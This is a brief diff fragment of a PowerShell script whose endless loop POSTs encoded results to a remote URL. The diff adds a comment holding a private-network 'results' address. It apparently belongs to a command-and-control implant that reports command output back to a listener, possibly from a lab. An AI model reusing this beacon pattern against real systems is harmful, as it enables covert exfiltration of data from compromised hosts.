@@ -67,7 +67,7 @@ for (;;){
         $data = @{result = "$EncodedText"}
         
         Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
-        
+        #http://192.168.71.142:8000/results/GTLBHU/
 
     # sleep $n
     }
